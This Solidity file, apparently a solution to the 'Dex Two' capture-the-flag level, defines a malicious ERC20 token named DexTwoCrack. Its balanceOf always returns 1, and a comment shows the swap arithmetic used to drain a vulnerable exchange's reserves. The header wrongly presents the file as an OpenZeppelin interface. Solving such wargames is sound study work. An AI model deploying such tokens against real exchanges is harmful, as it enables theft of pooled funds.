// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;

import "./ERC20.sol";


contract DexTwoCrack is ERC20{
//   function get_swap_amount(address from, address to, uint amount) public view returns(uint){
//     return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
//                1         *            100              /        1
//        = 100
//   }
    constructor() ERC20("DEX2Crack", "DEX2C"){
        _mint(_msgSender(), 1000);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return 1;
    }
}
